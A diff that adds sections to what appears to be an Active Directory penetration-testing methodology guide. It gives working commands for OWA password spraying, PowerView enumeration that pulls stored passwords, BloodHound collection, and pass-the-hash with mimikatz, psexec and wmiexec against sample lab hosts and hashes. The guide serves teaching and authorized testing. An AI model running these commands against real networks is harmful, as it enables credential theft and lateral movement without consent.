@@ -161,6 +161,21 @@ msf> use auxiliary/gather/kerberos_enumusers
 crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
 ```
 
+#### OWA (Outlook Web Access) server
+
+if you found one of these servers in the network you can also perform user enumeration against it. For example, you could use the tool [mailsniper](https://github.com/dafthack/MailSniper)
+```cmd
+ipmo C:\Tools\MailSniper\MailSniper.ps1
+# Get info about the domain
+Invoke-DomainHarvestOWA -ExchHostname [ip]
+# Enumerate valid users from a list of potential usernames
+Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
+# Password spraying
+Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
+# Get addresses list from the compromised mail
+Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
+```
+
 If we already have first and last names the following python script can make common usernames from them:
 
 ```python
@@ -391,7 +406,102 @@ Invoke-PasswordSprayGmail -UserList .\userlist.txt -Password Fall2016 -Threads 1
 
 Having compromised an account is a big step to start compromising the whole domain, because you are going to be able to start the Active Directory Enumeration:
 
+## Manual enumeration with
 
+#### [CMD](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#users)
+
+or a bit sneakier
+
+### [powershell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)
+
+or a bit more advanced
+
+### [Powerview/Sharpview](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview)
+
+Check out the full guides, here's a quick clip from the low-hanging fruit of powerview, with hacktricks
+
+```
+#Check if any user passwords are set
+$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl
+
+#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
+Find-LocalAdminAccess
+
+#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
+.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt
+
+#Enumerate machines where a particular user/group identity has local admin rights
+Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>
+
+# Enumerates the members of specified local group (default administrators)
+# for all the targeted machines on the current (or specified) domain.
+Invoke-EnumerateLocalAdmin
+Find-DomainLocalGroupMember
+
+#Search unconstrained delegation computers and show users
+Find-DomainUserLocation -ComputerUnconstrained -ShowAll
+
+#Admin users that allow delegation, logged into servers that allow unconstrained delegation
+Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation
+
+#Get members from Domain Admins (default) and a list of computers
+# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
+# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
+## By default users inside Domain Admins are searched
+Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
+Invoke-UserHunter [-CheckAccess]
+
+#Search "RDPUsers" users
+Invoke-UserHunter -GroupName "RDPUsers"
+
+#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
+Invoke-UserHunter -Stealth
+```
+
+## AdExplorer
+A tool with GUI that you can use to enumerate the directory is AdExplorer.exe from SysInternal Suite.
+
+## Bloodhound
+
+Another amazing tool for recon in an active directory is [Bloodhound](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound)  It is not very stealthy (depending on the collection methods you use), but if you don't care about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
+
+Bloodhound uses Ingestors to collect the data that you will then view in graph form.
+
+#### Windows
+
+They have several options but if you want to run SharpHound from a PC joined to the domain, using your current user and extract all the information you can do:
+```ps
+./SharpHound.exe --CollectionMethod All
+Invoke-BloodHound -CollectionMethod All
+```
+If you wish to execute SharpHound using different credentials you can create a CMD netonly session and run SharpHound from there:
+```cmd
+runas /netonly /user:domain\user "powershell.exe -exec bypass"
+```
+
+
+
+
+#### Python only
+
+If you have domain credentials you can run a python bloodhound ingestor from any platform so you don't need to depend on Windows.
+
+Get from
+
+https://github.com/fox-it/BloodHound.py
+
+or `pip3 install bloodhound`
+
+Execute with:
+
+```ps
+bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
+```
+If you are running it through proxychains add `--dns-tcp` for the DNS resolution to work throught the proxy.
+
+```ps
+proxychains bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all --dns-tcp
+```
 
 
 # Attacking AD
@@ -520,6 +630,51 @@ fgdump.exe -h 192.168.0.10 -u AnAdministrativeUser -s
 ## Saved to passwordhashes.txt then the command:
 ./john passwordhashes.txt
 ```
+
+
+If You can't crack them you can pass them or overpass them 
+
+## PTH From windows:
+
+Can be done with 
+
+mimikatz (powershell version here)
+```ps
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
+```
+
+psexec_windows.exe
+```cmd
+psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local
+```
+
+wmiexec.exe 
+```cmd
+wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local
+```
+
+Or many powershell scripts from [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) that do SMB, WMI and some other magic.
+
+
+## PTH From Linux
+
+Kali has a wide-array of pth tools wrapped into a passing-the-hash package:
+
+Install with
+
+`sudo apt install passing-the-hash`
+
+From tab-completion just to show the options.
+```
+─$ pth-
+pth-curl       pth-rpcclient  pth-smbget     pth-winexe     pth-wmis                                 
+pth-net        pth-smbclient  pth-sqsh       pth-wmic                     
+```
+
+## OVER-PASS-THE-HAS/PASS the Key attack
+
+This attack aims to use the user NTLM hash or AES keys to request Kerberos tickets, as an alternative to the common Pass The Hash over NTLM protocol. Therefore, this could be especially useful in networks where NTLM protocol is disabled and only Kerberos is allowed as authentication protocol.
+
 
 
 
